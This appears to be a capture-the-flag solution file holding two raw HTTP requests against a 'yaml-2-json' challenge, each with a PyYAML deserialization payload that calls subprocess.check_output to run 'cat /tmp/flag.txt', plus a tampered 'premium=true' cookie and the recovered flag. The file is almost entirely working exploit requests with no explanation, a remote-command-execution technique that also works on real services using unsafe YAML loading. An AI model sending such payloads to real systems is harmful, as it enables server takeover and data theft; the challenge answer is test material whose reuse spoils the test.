@@ -1,0 +1,57 @@
+POST / HTTP/1.1
+Host: yaml-2-json.ctf2021.hackpack.club
+Connection: close
+Content-Length: 76
+Cache-Control: max-age=0
+sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+Origin: https://yaml-2-json.ctf2021.hackpack.club
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://yaml-2-json.ctf2021.hackpack.club/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: _890f5=http://192.168.181.16:10993; premium=true
+
+yaml=!!python/object/apply:subprocess.check_output [["cat","/tmp/flag.txt"]]
+
+
+flag{Py_PyYaml_Yaml_Py}
+
+
+
+===================== Payload 2 =====================
+
+POST / HTTP/1.1
+Host: yaml-2-json.ctf2021.hackpack.club
+Connection: close
+Content-Length: 116
+Cache-Control: max-age=0
+sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+Origin: https://yaml-2-json.ctf2021.hackpack.club
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://yaml-2-json.ctf2021.hackpack.club/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: _890f5=http://192.168.181.16:10993; premium=true
+
+yaml=!!python/object/apply:subprocess.check_output
+       args: [ cat /tmp/flag.txt ]
+       kwds: { shell: true }
+
+
+flag{Py_PyYaml_Yaml_Py}
